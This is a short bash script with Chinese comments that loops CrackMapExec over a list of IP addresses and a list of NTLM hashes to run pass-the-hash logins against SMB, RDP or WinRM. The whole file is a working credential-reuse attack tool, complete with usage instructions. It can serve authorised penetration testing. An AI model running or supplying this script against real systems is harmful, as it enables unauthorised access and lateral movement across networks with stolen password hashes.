#!/bin/bash
#CME指定ip列表批量PassTheHash RDP/SMB服务（Winrm也可，但需要删除“--$mode-timeout 10”）
#使用方法：./test.sh smb

mode=$1
ip_filename="ip.txt"
hash_filename="hashs.txt"
timeout=10

readarray -t ips < "$ip_filename"

readarray -t hashes < "$hash_filename"

for ip in "${ips[@]}"; do

    for hash in "${hashes[@]}"; do
        timeout "$timeout" ./cme $mode "$ip" -H "$hash" --$mode-timeout 10
        # 如果返回值为非零，则跳出第一层for循环
        # if [ $? -ne 0 ]; then
        #     break
        #fi
    done
done
